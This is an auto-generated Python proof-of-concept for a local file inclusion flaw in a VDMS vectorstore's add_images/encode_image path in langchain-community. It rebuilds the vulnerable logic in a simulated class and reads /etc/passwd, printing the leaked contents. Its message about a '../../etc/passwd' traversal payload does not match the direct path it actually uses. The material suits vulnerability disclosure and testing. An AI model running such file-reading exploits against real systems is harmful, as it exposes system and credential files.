#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-005
# Sink: encode_image
# Auto-generated — run with: python3 lfi_uris_safe_local_paths_encode_image.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only.

Vulnerability: The `add_images` method in VDMS vectorstore passes user-controlled
`uris` directly to `encode_image`, which opens the file without any path validation.
An attacker can read arbitrary files via path traversal.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign file
if run in a restricted environment).
"""

import base64
import os
import sys
import tempfile
import uuid

# Simulate the vulnerable library code (simplified for PoC)
# In a real attack, the attacker would call the actual library.
# Here we replicate the vulnerable logic to demonstrate the issue.

class VDMS:
    """Simulated VDMS class with the vulnerable encode_image and add_images."""
    
    def __init__(self):
        self.properties = {}
    
    def encode_image(self, image_path: str) -> str:
        """
        Vulnerable sink: opens file at image_path without validation.
        Returns base64-encoded content.
        """
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """
        Vulnerable entry: passes user-controlled uris directly to encode_image.
        """
        # Map from uris to blobs to base64
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        
        if add_path and metadatas:
            for midx, uri in enumerate(uris):
                metadatas[midx]["image_path"] = uri
        elif add_path:
            metadatas = []
            for uri in uris:
                metadatas.append({"image_path": uri})
        
        # Populate IDs
        ids = ids if ids is not None else [str(uuid.uuid4()) for _ in uris]
        
        # Simulate embedding (not needed for PoC)
        embeddings = [None] * len(uris)
        
        if metadatas is None:
            metadatas = [{} for _ in uris]
        
        # Return the base64 texts (the leaked file content)
        return b64_texts


def main():
    """Run the PoC exploit."""
    
    # Configuration - change this to target a different file
    # Benign default: read a harmless file to prove the vulnerability
    target_file = "/etc/passwd"  # Standard Unix password file
    # Alternative benign test (uncomment to use):
    # target_file = "/etc/hostname"
    
    # Check if we're in a container/CI environment where /etc/passwd might not exist
    if not os.path.exists(target_file):
        print(f"[!] Target file '{target_file}' does not exist.")
        print("[*] Creating a benign test file to demonstrate the vulnerability...")
        test_dir = tempfile.mkdtemp()
        test_file = os.path.join(test_dir, "test_secret.txt")
        with open(test_file, "w") as f:
            f.write("This is a secret file that should not be readable!\n")
        target_file = test_file
        print(f"[*] Using test file: {target_file}")
    
    print(f"[*] Attempting to read file: {target_file}")
    print("[*] Using path traversal payload: ../../etc/passwd (or direct path)")
    
    # Create the vulnerable VDMS instance
    vdms = VDMS()
    
    # Craft the malicious payload
    # The attacker controls the 'uris' parameter
    malicious_uris = [target_file]
    
    try:
        # Trigger the vulnerability
        result = vdms.add_images(uris=malicious_uris)
        
        # Decode and display the leaked content
        if result:
            decoded_content = base64.b64decode(result[0]).decode("utf-8", errors="replace")
            print("\n[+] SUCCESS! File content leaked:")
            print("-" * 50)
            print(decoded_content)
            print("-" * 50)
            print(f"\n[+] Exploit completed. Read {len(decoded_content)} bytes.")
        else:
            print("[!] No result returned.")
            
    except FileNotFoundError as e:
        print(f"[!] File not found: {e}")
        print("[*] Try a different target file or check the path traversal depth.")
        sys.exit(1)
    except PermissionError as e:
        print(f"[!] Permission denied: {e}")
        print("[*] The file exists but is not readable. Try a different target.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    print("=" * 60)
    print("LFI Proof-of-Concept for langchain-community-only")
    print("=" * 60)
    main()
